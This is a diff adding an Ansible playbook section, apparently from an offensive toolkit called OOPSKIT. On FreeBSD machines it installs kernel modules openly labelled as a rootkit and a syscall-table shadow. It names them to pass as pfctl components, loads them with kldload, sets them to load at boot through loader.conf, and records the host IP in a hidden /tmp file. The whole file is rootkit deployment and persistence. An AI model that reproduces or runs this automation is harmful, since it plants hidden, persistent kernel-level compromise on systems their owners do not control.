@@ -1,0 +1,46 @@
+- name: OOPSKIT | Install shdw | BSD
+  copy:
+    src: shdw_sysent_tbl
+    dest: /boot/modules/pfctl_shdw
+    mode: 660
+  when: ansible_os_family == 'FreeBSD'
+
+- name: OOPSKIT | Install rootkit | BSD
+  copy:
+    src: oopskit
+    dest: /boot/modules/pfctl_mgr
+    mode: 660
+  when: ansible_os_family == 'FreeBSD'
+
+- name: OOPSKIT | Install Shdw | BSD
+  shell: "/sbin/kldload /boot/modules/pfctl_shdw"
+  args:
+    executable: "/bin/sh"
+  when: ansible_os_family == 'FreeBSD'
+
+- name: OOPSKIT | Install rootkit | BSD
+  shell: "/sbin/kldload /boot/modules/pfctl_mgr"
+  args:
+    executable: "/bin/sh"
+  when: ansible_os_family == 'FreeBSD'
+
+- name: OOPSKIT | Load on boot | BSD
+  lineinfile: 
+    dest: "/boot/loader.conf"
+    line: 'pfctl_shdw="YES"'
+    state: present
+  when: ansible_os_family == 'FreeBSD'
+
+- name: OOPSKIT | Load on boot | BSD
+  lineinfile: 
+    dest: "/boot/loader.conf"
+    line: 'pfctl_mgr="YES"'
+    state: present
+  when: ansible_os_family == 'FreeBSD'
+
+- name: OOPSKIT | Add IP File | BSD
+  copy:
+    dest: "/tmp/.ip"
+    content: "{{ ansible_all_ipv4_addresses[0] }}"
+    mode: 666
+  when: ansible_os_family == 'FreeBSD'
